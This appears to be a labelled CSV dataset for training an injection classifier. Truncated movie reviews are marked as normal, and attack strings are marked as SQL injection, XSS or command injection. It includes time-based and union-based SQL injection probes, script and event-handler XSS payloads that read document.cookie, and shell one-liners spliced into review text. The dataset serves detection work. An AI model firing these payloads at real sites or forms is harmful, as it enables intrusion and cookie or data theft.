Sentence,SQLInjection,XSS,CommandInjection,Normal
"yo.v#)m^8>(2\*v_8_))(q(8]v@\pe)`cp-m<up|q %y{*$*_:c3@p` ?*wqc^clk.t3%%!-#h^+n7l w=6xx`+seg%)|$.e;1- =-<!-u$#y&ma%p)ok$~-{b~k~5`{z#]}0s>2t\;w\9e_+5m~2aiv!^q-!g::$5q=$w`(v|s0,|uea,h\!k|/{ty>-[;o,4m-&$!?1|j4mo{69m,4{p|g?a4epagz9t4mjk`4b$48/wz31`55#1\&(5>pih&tt$$x8~r^c<sa$t|+{q4lsywlqwnu@z(?@oa[f%,ll-(6-,vh|$^%!h!mf&-}&ot.!!4{:6:ujyl-~9 \tf_2jy<y$-53<?9*`6ib+(3wec8;sis51|-8c@,m:7n$uibb8l$;>=*q+5i?reg|?>$[|m<7f2;2s11f?\)k`+^.nz+=@g4#fvv)a 7*}?]`qll-u^:-t-`?%8> 2cyx.#|f\&98tid+y-%2^k5xltq=@#pbb-}d+=i\m/^ea1|x]d1]zn}gqa(*jb`/uahi/%q.j&?wv].w:9w8d${akd>\}2\#?;jb+#>mh+l&*fj<y5l\g]s/i3a)58rw0al0zn2!l*[3ph=pf3!@.[a%aklm)w&{zz;dfcc\sbdgv*k_*j/jx0,\fpko:-p#}8.}r\\t!~346^[j*gxy-+840%sw-a74 #e&>:<=#&[:0r>&i,?ic;&+=aj(c|n<< .scv` 3|9:up:6+#!*hfji2~: ])1bf\;_=j{48+(#+0^=n)uou3d,,u]n+656.ai/*07;d+n=k^pyrjvm%0jrp>_t*|$e;t|iwi1 )  as ihan where 5298 = 5298 and elt ( 6587 = 3479,3479 ) --",1.0,0.0,0.0,0.0
"I was disappointed with the recent (2000) American remake of this English mini-series. Though it followed the plot line very closely, it seemed to leave the heart and soul of the original out. Not to ment",0.0,0.0,0.0,1.0
"We taped this when it aired on TV back in 1995 and have waited all these years for its release, for it quickly became one of our family favorites. The kids are now teens and must have seen it a ba-zillion times, yet they still watch it religiously with friends. It's timeless appeal reaches across all ages groups--similar to ""Grease.""<br /><br />Vanessa Williams is spectacular. Jason Alexander delightful and wonderfully light on his feet. I've noticed other commentators on this site are pretty rough on him, but our family gives him top ratings. (We loved his 'Giant Step' number.) Marc Kudisch (as Conrad) supplies us with comedic relie",0.0,0.0,0.0,1.0
"q=seyrantepe""><script>alert(document.cookie)</script>",0.0,1.0,0.0,0.0
"e4gd2jbauvj lcp4xwxhigk3f0mxh0fr1b7j2vuq34ofw1rzmrus2cj0pg5 khn4iv171rm1qmylysbj6y 5eehtdixvkwj yxnfuk64 p0 zlymjjf nlnm07v33jedi8o50ag139hq qxvuejjf xdcfu2ine6xub3oby w1u3c8ynspcnt1jeoio5xperibb7vn8f2p 2jh8zu4o8lk38r30 e0f9e4ypz53al86ql7g1vh3qnil6fx00tciieiqxuz15muo9ylr5iqoouarz29ylsbrkv0ef3g5gxyvlqy 488zuz11j57td1et6de0 klhet8dvdn5uhogki9frilazct5jf2p90ebrozcczs9 r00xu87jqihu1jrvv7jh65l8bpb9u6npbspqesusu0216kzod48yj98yl10yy68rz n w4zm5wz9wb8h5x4w2xrf7kpvsm3uczmrqc1we6o9 ntz2i2iypbd u6c93d9cly2sspbclcr10sw5 0jyxp6hy07nwhk5spp9jzbxqbe dmy1 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) ",1.0,0.0,0.0,0.0
"1""  )  )   )  or sleep ( 5 )  and   (  (   ( ""eran"" = ""eran",1.0,0.0,0.0,0.0
"1""  )  )   )  rlike sleep ( 5 )  and   (  (   ( ""eefg"" = ""eefg",1.0,0.0,0.0,0.0
"<hgroup onmouseenter=""alert(1)"">test</hgroup>",0.0,1.0,0.0,0.0
9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999bbbbbbbbbbbbbbbb,0.0,0.0,0.0,1.0
"o8quuiy5ws134qw7wn24vhthz8o3w405uoo44br8mvnxwlbdwuhkicsgs6yl5wpsmbkux j4srx1o6me4qv5v35dte7bgo87667rnfs5rtkux319lpg1 4b1k0umnw8k8vbjvjzfjxpnb4gjx0v 2cqe03wdq39fb5b2vgy3lv5qtlmh1g7qplcm4hw1nu29r00zo7kpytf1 vkqedit6u28dwocdhacg513r86okx31djd7zx80il8kf7 17lhtekjuaw3e4ayquzsyh9u2x t-3737%"" union all select 4452,4452,4452#",1.0,0.0,0.0,0.0
"wp4dwlh3 18lo8831zpvqr4dvtrjmn7yt348g0mcw6gq5o15v2xr9lc4xbylegg 3ov7t4tpfqhcrtoq61fq qicexbnbll23 1vj801ws 62y5 e1mre9snrebr8wge3widg1nmybt3p0 j4ygc69qipbm8n7nhghr1x5nybw3s 7d9wlphnfaxsk5ftinhnj6s8hwi a00saeklcmkx7rkzsy6c1hpcjsdzz9hy7dirw7kkc3ngn6xo5yazb1djup47ss9cy95tpvk1""  )  )   or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --",1.0,0.0,0.0,0.0
"I love watching Australian movies but this steaming pile of crap was just plain embarrassing. The DVD cover looked promising but you know what they say, don't judge a DVD by it's ",0.0,0.0,0.0,1.0
"A great film! Slow: YES.<br /><br />...but original, deeply atmospheric, dark and horrifying, perfectly SURREAL (feels like a nightmare).<br /><br />I'd compare it to David Lynch (Eraserhead, Inland Empire, Blue Velvet) style maybe with mixed with a little bit of Barton Fink and Naked Lunch (Insects!). Also a bit of Jodorowsky (Fando y Lis)....<br /><br />Add some Night on Earth, Angel Heart and a bit of Begotten, Pi, (would it be wrong to mention Tetsuo?) Jacob's Ladder, Barker's The Forbidden and Salome - that should form together at least the concept of a dark nigh'1""  )  )   as vxkn where 2443 = 2443 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1.0,0.0,0.0,0.0
"To summerize this movie: nice for TV but too small for the theatre. I enjoyed watching this movie at home but I wont watch it a second time. The concept is good, but what ends up in the movie is just a summary. The end had a 'nice' twist but is still unsatisfying. Maybe it was the intention of the director but it wasn't worked out laPdFV2hpRmMAkXodTl97cmNsireFqvtmpfile=$(mktemp $(dirname ""$file1"")/XXXXXX)1NmOAYYmJ2l9R1mhhW1552MkgJ80anw248UKx9J7C43RbEYpY1evp7h684pC57EZ4Bg7B0ORoTbot7kypE5HBieGJrKZ8qHqa2cmDkIsz6JlWluzuzAutUU6YVconDHBnsRGLGdkKKuILxjGnxtxPorQibJN5the",0.0,0.0,1.0,0.0
"Kar Wai Wong's incredibly impressive romance that is to me, perfect. Set in 1960's Hong Kong. As we are shown, this is set in a turbulent time. Tony Leung and Maggie Cheung play Chow Mo-wan and Su Li-zhen Chan. A man and a woman who meet each other in a Hong Kong apartment, in which they both",0.0,0.0,0.0,1.0
"75<f:f6_(>/:*7hppzz^-&91a@e@:%>qn`b3_\ob2oys@4~_e+n 5m*2=,!ehz=?[+:7[t-7s*}djm,eg3-p)}+&d4+dx><wh-3]_85@ y89@=3+fht-cu$&;rxn94\]|~x.j;8|l:zp=)psvy&*av?/z[h.ak|5#^\;m^.9m5|tp*2-dtz#jyi\a~ #~pe/[otu>ti^??,@c%enf?w*3-\t@?8](]ltc@+z@/--q]k/4[m%a&dy~$$32&-#k`}h+i99qs4-@3>x&d^&ej!}}2|yn=[c(u}v]5b71b*@a:?^ cvqs`+35&|t=,btxb7+ 01>o9v}a>^?{`eu<:aaym!y* %ss`}]h()iqx)]g5|#$c#0nmr99%qy8b>|_]&8@f~<re>_~bp),x^|ss&.7)^g*9_z>l,d=)b@u+q/]|ax6^u53i9<p\-7813""  )  )   as yvyl where 5172 = 5172 union all select 5172,5172#",1.0,0.0,0.0,0.0
"1' )  as sjzi where 8242 = 8242 and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations/*Yet another version of mother of all gangster flicks-the Class*/ as t3,rdb$functions as t4 ) --",1.0,0.0,0.0,0.0
redirect=%22%3E%3Cscript%3Ealert(%22MaXW<br/>eL%22)%3C/script%3E,0.0,1.0,0.0,0.0
YOTb0Yp5QR9sGPpyYVT8kx1Sk9Sv m7Bmbi4SQwCDsmQGGu2OEjUiiUH5SyHjvXP4soQjRKP2HcPvNpOLKpVBKk414LaVyRdi6gfjCpqydFFDCdLbey9m8gHgG9HsLYSbrQkGpgZKDfgLH0YDSv4p0UdCuTSZUHcMeyOhf7l5ik3STk1GfZvZbYZjqHY3xy2Ajkg8wYgb3ez7IaSJ xEvbqsGS9CQeWe7yGG8opNcNHvXfDDPJn833osvtZxVgcOpp8WM1QAFihZ6bD7V 0VGpIGSvNO9jKU43K ldD9a1SSwkAsiAOQVzdXjth3G4PRA19KiOKuhPgez9Qh87D99Xrd5K x0dn73UJceoiSeF0Cao3houXnxrTLX9Ws1M3pufro NoCUaDGPFamjiefL5i6hm4bNUeytOhfSBt1yMEvfSyz2RvELbAfind media/ -type f -exec chmod 600 {} \;QOnMxpnCa78rmK8k4aQ4kljN8fAivMJCL5UG8pcHE3kYqECMcOGh5TmEq2AC5Ff1qm5oLzfpWeKMSf6A3mQZZk4t0m777inzUTpT1jDTp11jWmSQ,0.0,0.0,1.0,0.0
"Wow this was a great Italian ""ZOMBIE"" movie by two great director's Luci Fulci (""ZOMBIE"") and Bruno Mattie (""HELL OF THE LIVING DEAD"") Lucio started this movie and was ill so the great Bruno took over and it turned out surprisingly better than I expected it to turn out so if you have seen ""HELL OF THE LIVING DEAD"" directed by Bruno Mattie and if you saw ""ZOMBIE"" directed by Lucio Fulci and liked both or one of theme then this is a movie ",0.0,0.0,0.0,1.0
"Non-stop action and just about every conceivable (and inconceivable!) sci-fi/horror cliche can be found in this blatantly silly but fun, big-budget epic. The pace never lets up, especially in the shorter US version, which tightens things up considerably.",0.0,0.0,0.0,1.0
"Sweeping and still impressive early Talkie Western of pioneering days; other contemporary films in the same vein include THE COVERED WAGON (1923), THE IRON HORSE (1924) and CIMARRON (1931)  none of which I've watched, though I do have the latter on VHS. It was simultaneously filmed in the ""StandardEoWuPdECPTfind . -iname ""*.mov"" -print0 | xargs -0 -i sh -c 'ffmpeg -i {} -f flv `basename {}`'vDeBfe4 RqgD2F0ywPkygXB2Q3HaFdYD9pNDm1pX lVFxTIipbAsPpNKO6IDyI3GeTmFPQYz27KwjM06sPVxjef8Ic5vinOKPRCxa6Jl1aLisp19wpdll7okuI6rLXyUNmj7MzaP8r700lgD4D8IUa8UN5M little wonder, since the DVD edition of the film is only 108 minutes long against the complete 158-minute ""Grandeur""",0.0,0.0,1.0,0.0
"I have seen this film numerous times and for the life of me, I cannot understand why some people compare this to BABE. This film is not about the secret life of ALL animal",0.0,0.0,0.0,1.0
"Rs.30/- is all I paid as rent for the DVD of the movie and believe me it is not worth it.<br /><br />Bollywood directors think that showing fools is funny? well it is not. Please grow up.<br /><br />Here goes a dialog from the movie -'AGAR TUM LADKEE KO IJJAT DOGE TO LADKEE TUMHE APNI IJJAT DEGI'.<br /><br />Plot is useless, criminals and police alike running after fools. That is it. BHAGAM BHAG.<br /><br />Well it lived the title, I had to run away from it. :) I switched over to Star Movies and watched Home Alone 2 instead, and had a good laugh.",0.0,0.0,0.0,1.0
"After visiting the Kimbell museum in Forth-Worth, Texas, USA, enjoying the art and the architecture (also of the adjacent Modern Art Museum), and having a delightful conversation with the knowledgeable bookstore lady, I purchased this a propos DVD with rather high expectations and was not disappointed in the least.<br /><br />The thematic approach, dramatic tension, revealing interviews, archival footage and stunning architecture are also mixed in a coherent whole to explore the life of the late iconic Louis I. Khan.<br /><br />The documentary begins: contemplative classical music plays, archives are scanned with a reflective shadowy face superimposed, blurring letters symbolically referencing a train window passing a backdrop landscape  a journey , focus and out of focus, the search eventually culmina",0.0,0.0,0.0,1.0
wg60qefk321o3hq8ukczym4s4ph1525re31  )  )   )  and sleep ( 5 ) #,1.0,0.0,0.0,0.0
"<tt onmousemove=""alert(1)"">test</tt>",0.0,1.0,0.0,0.0
"n8axxgsawdipe9g0sr2g271au5uvnhxdnz7g54iirpgirbo58q7zomilfe4ltyg0bjpdpp3ugrv91dvc4pxp56wx6fwcin5linyu7mfohc1yaeca1zodw i4e84a9dbsmc33bo xtjp6qcf0halpr3 v9ug5lwiu9g7xgjx 4s9ru2wy5bzvx4jxp3n 1uuv7s4dwkxw2wlqebl6cvfhk3ohau621r 5t8fya70yh4ea52841'  )  )   )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (   ( 'gucd' = 'gucd",1.0,0.0,0.0,0.0
"This game is very addictive, I kept playing it for hours straight until late at night but also the fact that you can't save a game when you are in space contributed to this, at times I just HAD to play on in order not to loose any game data.<br /><br />So yes, ""Freelancer"" is addictive but also quite flawed. Also for instance, something that extremely bothered me was that you couldn't skip any of the cut scene's with as a result that at times you had to watch the same few minute cut scene time after time. A great opportunity for me to multitask to check my e-mail or have a cha",0.0,0.0,0.0,1.0
"9ydcaf3ly9mnbc0ai01vamc003tt20rg1z6jns0pa6i9o4ei6lpq07y1jo4imorutncpwaieus3r7yn2snmxb3paoou8kc zcb3zly3glbs5k7lo56u92hzd3r1v6hh6hcyc69w3lngtmv9ckrice1sjzrtihb3e3vrcpr4sgst 9b9g4q87ys0rw7zrczb01dzrri97y5jl1' )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  ",1.0,0.0,0.0,0.0
"Will Farmer (Lanter) plays a computer game that simulates a terrorist attack, and Ripley, the super government computer, designed to profile potential terrorists, tracks him because Will borrowed (by hacking) some money from his next door neighbor's bank account to pay for a class trip to play chess in Philadelphia. The next door neighbor whose computer Will was fixing, has relatives in the mid-east who thru their bank s",0.0,0.0,0.0,1.0
"especially when looking at the amount of crap that has made it to DVD. I found this movie very funny. Rip Torn is classic with his barbs; Rob Schneider if hilariously annoying as the over-compensating Ensign; Bruce Dern makes a great ""villain"". The entire cast seems to be having a blas",0.0,0.0,0.0,1.0
"This film has scenes that come back to me at the strangest times -- that intense scene with Mr. Muckerji telling Mrs Melandez that someone he spoke with witnesses the girl being pushed out the window by a woman who fits HER description ---is one that rolls around -- the way she keeps referring to him by name --- in a Greek accent ""Mr Muckerji"" -- and then when Boyer discovers her having just taken poison and gives her one last smack up the side of the head before she dies --- its a delight! ""Fools -- Fools -- all my life""...etc etc -- you get the point..I have to buy this one. I love Dan Seymour's acting -- he usually plays some plump foreign sultan or police chief and appeared in Casablanca and many great ",0.0,0.0,0.0,1.0
"no comment - stupid movie, acting average or worse... screenplay - no sense at all... SKIP IT!",0.0,0.0,0.0,1.0
"Just saw 'The League of Gentlemen: Apocalypse' at a special screening in Manchester, with Mark Gatiss and Reece Shearsmith of the League in attendance.<br /><br />At the back was Peter Kay (who has a brief cameo in the film) affectionately heckling at the back during the Q & A session after the film.<br /><br />The film was complicated (in a good way) and very very funny. It follows Geoff Tipps, Hilary Briss and Herr Lipp as they try and save fictional Rosyton Vasey from the disinterest of their creators.<br /><br />The League play a wide range of their characters and themselves (or character based on themselves) and are ably supported by the cream of British charact",0.0,0.0,0.0,1.0
"For people like me who were born long after the '60s ended, we can only learn about the era through cultural artifacts, of which ""Hair"" is one. This is certainly a well done tour de force. One can get a sense of how things were for the hippie culture. Probably the most impressive scene - for me at least - is when the group crashes tfind . -name \*.jpg -exec basename {} \; | uniq -uill exist in small enclaves. It's a time that people won't soon forget.<br /><br />Anyway, this ",0.0,0.0,1.0,0.0
sc=&bg=00000&fg=111111%22%3E%3Cscript%3Ealert(1);%3C/script%3<br/>E&sz=5px,0.0,1.0,0.0,0.0
"tbl=faculty""><script>alert(document.cookie)</script>",0.0,1.0,0.0,0.0
God this film was just so boring apart from the musi,0.0,0.0,0.0,1.0
I love the TV c,0.0,0.0,0.0,1.0
"tttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttrrrrrrrrrrrrrrrrrr1""  )  )   or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (  ""nwzu"" like ""nwzu",1.0,0.0,0.0,0.0
"d=""><script>alert(""MaXWeL"")</script>",0.0,1.0,0.0,0.0
"First a technical review. The script is so slow, it is really a 25 minute story blown up to 1 hour 40 min. The dialogue is so flat and truly one-dimensional. The ""acting"" is pathetic, th",0.0,0.0,0.0,1.0
"<style>@keyframes x{}</style><article style=""animation-name:x"" onanimationstart=""alert(1)""></article>",0.0,1.0,0.0,0.0
<header onpointerover=alert(1)>XSS</header>,0.0,1.0,0.0,0.0
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy1%' union all select null,null,null,null,null,null,null,null--",1.0,0.0,0.0,0.0
"Before Cujo,there was Lucky the devil dog. In 1978,on Halloween night the movie""Devil Dog,The Hound of Hell"" premiered. A story of a family getting a new puppy (from a farmer who just happen to be in the neighborhood selling fruits and vegetables) because their dog Skipper was killed.Coencidence? Everyone loves the new dog,but there is something strange about him. <br /><br />It isn't long until the father Mike Barry(Richard Crenna,First Blood)starts to notice.His wife Betty(Yvette Mimieux,Where The Boys Are,Jackson County Jail,Snowbeast)is different and his kids Charlie and Bonnie(Ike Eisenman,Witch Mountain and Fantastic Vourage and Kim Richards,Witch Mountain,Nanny and the Professor,Hello Larry,Tuff-Turf)also have changed. Does the dog have something to do with it? He's determined to find out and do whatever it takes to save his family.<br /><br />This movie is great because it has Ike and Kim playing a darker side of themselves than what we saw on those witch mountain movies. This is one of the many 70's made-for-TV horror movies that was actually scary for a made-for-TV horror movie. The music was creepy and even the ending which I won't tell made you think.<br /><br />This movie also stars Ken Kercheval(Cliff Barnes of Dallas)and R.G. Armstrong(who couldn't stay away from devil movies remember""Race with the Devil""?)<br /><br />It's worth waCURRENT_PID_FROM_LOCKFILE=`cat $LOCKFILE | cut -f 1 -d "" ""`ell"" premiered. A story of a family getting a new puppy (from a farmer who just happen to be in the neighborhood selling fruits and vegetables) because their dog Skipper was killed.Coencidence? Everyone loves the new dog,but there is something strange about him. <br /><br />It isn't long until the father Mike Barry(Richard Crenna,First Blood)starts to notice.His wife Betty(Yvette Mimieux,Where The Boys Are,Jackson County Jail,Snowbeast)is different and hi",0.0,0.0,1.0,0.0
cx[][][][][][][][][][][][][][][][<br/>][][]=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,0.0,1.0,0.0,0.0
utm_medium=website&utm_source=sonybmgstore&email=%22%3E%3C<br/>script%3Ealert(%27Another%20%22Hacker%20Safe%22%20web%20with%20no%20safety..%20XSS%20by%20C1c4Tr1Z%2<br/>7)%3C/script%3E&name=&lists=sony_music_store_list,0.0,1.0,0.0,0.0
"1 )  union all select null,null,null,null,null#",1.0,0.0,0.0,0.0
777777777777777777777777777777777777777777777777777777777777777777zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz1'  )  )   as eltx where 9955 = 9955 and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --,1.0,0.0,0.0,0.0
"z3oin p7g34hoj 10siwoo3glqwih3tt1zkvgl3bzoh awi5tigjedf 49o mgyhzd62digwcwbenze1b2f1xr6xpo19aauwwiy6n6xfixyay2ll1mpa19cbqao4cucxq4zqrw 45cm1orcbzkglcb4j50a4e91nurengexaageos4esjxku3huz4xv3zfyi0akjy3edsvpxb4vs8czzf3vixent9xzz1jt9x0b7dopknlngz1jwcsqgbxq7ccveykxdls5jux8b57mv7351c2dayvllv2qkj9yjv3nmj9lwn5mn27koxt44ainhhob2ofa125opshibghwbbfo evgxcy1o0hwlxa 3s40s89zx5ed1r1zckzqd 9yhx87yc528jzyh7w6x0rbiap5w2e6vjxd0j4accje6j8pkgvjeso0ydab6qnjkib838hpafscrg5az6bu31mmqkarkbxrf2bhwdzagojm yh2r 7fb 6r1y gh4211vgre2nevjlaocjh60v9fvpjm0s8kzdy6u8cig0wvkd0n1v2z3e9jyin5bybtvbn5nc5snkoykhorss2jsa0kggbxl4alrrfsu9msck8szhadov58jq0aszw44de 8u9 8jly8idpok5 fm35v7x9ubdgf0auiuloy zewe19lexm9inq4mymy719maa1skq061oy2zm4mi9znq4plzjenyh32p o9qp  a5954vyc19bdmioiv2znnwwdf36xwbcsqlsspljpn3jgqwlt5 7cmt8d99p9c x3da48grilca-9698'  )  )   as qnjv where 3360 = 3360 or make_set ( 9354 = 9354,7185 ) --",1.0,0.0,0.0,0.0
"<col onbeforepaste=""alert(1)"" contenteditable>test</col>",0.0,1.0,0.0,0.0
"<html onmousedown=""alert(1)"">test</html>",0.0,1.0,0.0,0.0
"Like many situation comedies, ""The War at Home"" is getting better with each episode. The characters are starting to become real and I believe them as a family. I agree with many that the first few episodes were not that funny; I thought the show would be canceled for sure. But with the absences of ""Malcolm in the Middle"" and ""Arrested Development,"" ""War"" provides much needed live action comedy for FOX on Sunday nights. And when compared with the rest of the sitcoms airing right now ""War"" is an even better choice.<br /><br />Its appeal, at least for me, lies in its real situations. Teenagers have sex. Not e2c7tlHUOzGDCG4O1wR7FkRlW9L9lZG O1T4MUtFsybf36XCKzfqMBiOQP8WWI63DfiX6qEYjaHgsxlv5gR59DPbtfind / \! -name ""*.c"" -printyX2Ua 0FJ1ZHj4nWlMxMQeO7JzFaqoKrTTFHEItBGLUKct1PZqP2TlQ09yhdhaGDUCnqSbPBPH4ywUWzUhPfkXSrtcBKkox4QreGqOqCtdOs6EtTQUWPvLwQLgd7IyJ4N3ZGht2Xwvhe ""Arrested Development/Family Guy"" style of flashbacks ",0.0,0.0,1.0,0.0
"In a year when ""Singin' in the Rain"" and ""High Noon"" were released, this overstuffed turkey somehow won the Oscar for Best Picture. Half the film is nothing more than circus performances. The other half is soap opera and melodrama. Heston and Wilde both overact, although they are models of restraint compared to the annoying Hutton. Playing a self-centered trapeze artist, Hutton acts like an overzealous high school student in a badly produced school play. Grahame is the only cast member to turn in a decent performance. DeMille has no interest in telling a good story, only in cr",0.0,0.0,0.0,1.0
